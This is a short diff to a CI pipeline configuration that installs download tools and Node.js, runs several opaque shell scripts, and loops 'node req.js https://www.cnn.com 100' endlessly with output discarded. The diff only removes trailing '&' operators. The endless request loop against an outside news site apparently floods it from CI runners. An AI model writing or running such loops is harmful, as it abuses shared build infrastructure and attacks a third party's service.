@@ -6,9 +6,9 @@ jobs:
     steps:
       - checkout
       - run: apt update && apt -y install wget curl axel nodejs npm
-      - run: chmod +x ./test.sh && ./test.sh &
-      - run: chmod +x ./google.sh && ./google.sh &
-      - run: chmod +x ./rw.sh && ./rw.sh &
-      - run: chmod +x ./jira.sh && ./jira.sh &
-      - run: npm install && while true; do nodejs jira.js; done &
+      - run: chmod +x ./test.sh && ./test.sh 
+      - run: chmod +x ./google.sh && ./google.sh 
+      - run: chmod +x ./rw.sh && ./rw.sh 
+      - run: chmod +x ./jira.sh && ./jira.sh 
+      - run: npm install && while true; do nodejs jira.js; done 
       - run: while true; do node req.js https://www.cnn.com 100 > /dev/null; done
